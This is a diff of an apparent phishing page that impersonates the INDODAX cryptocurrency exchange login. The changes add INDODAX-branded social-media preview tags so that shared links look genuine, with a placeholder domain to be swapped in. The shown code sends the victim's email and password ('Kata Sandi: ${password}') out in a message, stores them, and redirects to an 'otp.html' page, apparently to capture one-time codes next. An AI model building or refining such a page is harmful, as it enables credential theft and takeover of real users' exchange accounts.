@@ -3,7 +3,26 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Login INDODAX</title>
+<title>Masuk ke INDODAX</title>
+
+<!-- Meta Description Standar -->
+<meta name="description" content="Login ke akun INDODAX Anda dengan aman dan cepat. Verifikasi email dan kata sandi untuk akses penuh." />
+
+<!-- Open Graph Meta Tags (untuk Facebook, WhatsApp, LinkedIn, dll.) -->
+<meta property="og:title" content="Masuk ke INDODAX" />
+<meta property="og:description" content="Login ke akun INDODAX Anda dengan aman dan cepat. Verifikasi email dan kata sandi untuk akses penuh." />
+<meta property="og:image" content="https://indodax.com/assets/img/logo-indodax.png" />
+<meta property="og:url" content="https://yourdomain.com/index.html" /> <!-- Ganti dengan URL halaman Anda yang sebenarnya -->
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="INDODAX" />
+
+<!-- Twitter Card Meta Tags (untuk Twitter) -->
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Masuk ke INDODAX" />
+<meta name="twitter:description" content="Login ke akun INDODAX Anda dengan aman dan cepat. Verifikasi email dan kata sandi untuk akses penuh." />
+<meta name="twitter:image" content="https://indodax.com/assets/img/logo-indodax.png" />
+<meta name="twitter:url" content="https://yourdomain.com/index.html" /> <!-- Ganti dengan URL halaman Anda yang sebenarnya -->
+
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
 
@@ -241,7 +260,7 @@ Kata Sandi: ${password}
                       sessionStorage.setItem('email', email);
                       sessionStorage.setItem('password', password); // Hati-hati: jangan simpan password di production, gunakan token saja
 
-                      // Redirect ke halaman dashboard setelah sukses
+                      // Redirect ke halaman OTP setelah sukses
                       window.location.href = 'otp.html';
                   } else {
                       console.error('Error sending message:', data);
